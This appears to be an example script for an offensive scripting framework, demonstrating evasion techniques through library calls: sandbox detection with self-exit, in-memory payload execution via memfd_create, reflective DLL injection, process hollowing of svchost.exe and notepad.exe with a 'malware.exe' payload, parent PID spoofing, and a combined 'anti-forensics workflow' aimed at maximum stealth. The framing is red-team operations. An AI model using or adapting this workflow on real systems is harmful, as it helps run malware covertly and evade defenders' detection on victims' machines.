// Artifact-less Execution Examples
// Demonstrates in-memory execution without disk artifacts

// Example 1: Detect VM/Container Environment (Linux/Windows)
// This helps avoid sandbox detection during red team operations
let env = detect_environment()
print("Environment Type: " + env.type)
print("Confidence: " + str(env.confidence))
print("Is Sandbox: " + str(env.is_sandbox))

if env.is_sandbox {
    print("[!] Running in sandbox - exiting to avoid detection")
    exit(0)
}

// Example 2: Linux memfd_create Execution
// Execute binary in memory without writing to disk (Linux only)
if platform == "linux" {
    let binary_data = read_file("/tmp/payload.elf")
    
    // Execute binary from memory with arguments
    let proc = memfd_execute(binary_data, ["--target", "127.0.0.1"])
    print("[+] Process started with PID: " + str(proc.pid))
}

// Example 3: Reflective DLL Injection (Windows)
// Inject DLL into target process without LoadLibrary (Windows only)
if platform == "windows" {
    let dll_data = read_file("C:\\payload.dll")
    let target_pid = 1234
    
    // Inject DLL reflectively
    let result = reflective_dll_inject(target_pid, dll_data)
    if result.success {
        print("[+] DLL injected successfully")
    } else {
        print("[-] Injection failed: " + result.error)
    }
}

// Example 4: Process Hollowing (Windows)
// Create suspended process and replace with payload (Windows only)
if platform == "windows" {
    let payload_data = read_file("C:\\malware.exe")
    let target_path = "C:\\Windows\\System32\\svchost.exe"
    
    // Hollow out legitimate process and inject payload
    let result = process_hollow(target_path, payload_data)
    if result.success {
        print("[+] Process hollowing successful, PID: " + str(result.pid))
    } else {
        print("[-] Process hollowing failed: " + result.error)
    }
}

// Example 5: Parent PID Spoofing (Linux)
// Spawn process with spoofed parent PID (Linux only)
if platform == "linux" {
    let target_ppid = 1  // systemd PID
    
    // Spawn with spoofed parent
    let result = ppid_spoof(target_ppid, "/bin/bash", ["-c", "whoami"])
    if result.success {
        print("[+] Spawned with spoofed PPID: " + str(result.pid))
    } else {
        print("[-] PPID spoofing failed: " + result.error)
    }
}

// Example 6: Syscall Tracing for Sandbox Detection (Linux)
// Monitor syscalls to detect sandbox probing behavior
if platform == "linux" {
    let tracer = syscall_tracer_new()
    tracer.start_monitoring()
    
    // Simulate some operations
    file_exists("/proc/self/exe")
    file_exists("/etc/passwd")
    
    // Check for anomalies
    let is_sandbox = tracer.detect_sandbox()
    if is_sandbox {
        print("[!] Sandbox detected via syscall anomalies")
    }
    
    tracer.stop_monitoring()
}

// Example 7: eBPF Monitoring (Linux, requires kernel 5.8+)
// Attach eBPF programs for real-time monitoring
if platform == "linux" {
    let monitor = ebpf_monitor_new()
    
    let result = monitor.attach()
    if result.success {
        print("[+] eBPF monitor attached")
        
        // Monitor events for 10 seconds
        sleep(10000)
        
        let events = monitor.get_events()
        print("[+] Captured " + str(len(events)) + " events")
        
        monitor.detach()
    } else {
        print("[-] eBPF attach failed (kernel 5.8+ required)")
    }
}

// Example 8: Complete Anti-Forensics Workflow
// Combine multiple techniques for maximum stealth

// Step 1: Environment detection
let env = detect_environment()
if env.is_sandbox {
    print("[!] Sandbox detected, aborting")
    exit(0)
}

// Step 2: Start syscall monitoring (Linux)
if platform == "linux" {
    let tracer = syscall_tracer_new()
    tracer.start_monitoring()
}

// Step 3: Execute payload artifact-less
if platform == "linux" {
    let payload = read_file("/tmp/payload.elf")
    let proc = memfd_execute(payload, [])
    print("[+] Payload executing in memory, PID: " + str(proc.pid))
} else if platform == "windows" {
    let payload = read_file("C:\\payload.exe")
    let result = process_hollow("C:\\Windows\\System32\\notepad.exe", payload)
    print("[+] Payload executing via process hollowing, PID: " + str(result.pid))
}

// Step 4: Check for detection
if platform == "linux" {
    sleep(5000)
    let is_detected = tracer.detect_sandbox()
    if is_detected {
        print("[!] Possible detection, terminating")
        exit(1)
    }
}

print("[+] Operation completed successfully")
